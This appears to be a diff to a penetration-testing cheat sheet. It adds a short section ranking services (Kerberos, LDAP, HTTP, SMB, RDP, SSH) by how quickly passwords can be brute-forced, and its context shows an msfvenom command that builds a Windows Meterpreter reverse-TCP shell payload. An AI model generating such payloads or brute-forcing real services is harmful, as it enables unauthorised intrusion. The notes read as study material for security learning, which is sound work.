@@ -378,6 +378,18 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ##### -=Flags=-
 -l = List (lists out the specified category/etc), -h = Help (displays a help menu for msfvenom usage and flags), -p = Payload (specifies the payload type)
 
+### Password Attacks
+Cracking a password is mostly based upon educated guessing, heavily depending on the target's predictability or inclination towards simplicity when creating a password.
+Certain services are not worth attempting to bruteforce due to the sheer amount of time it will consume. Some common services and their bruteforcing speeds are as follows:
+Fastest: Kerberos, LDAP
+Fast: HTTP/S, FTP
+Medium: SMB
+Slow: RDP
+Very Slow: SSH
+
+
+#### 
+
 ## Reverse Engineering 🔄
 
 WRITE STUFF HERE ABOUT OBJDUMP, STRINGS, ASSEMBLY, GHIDRA
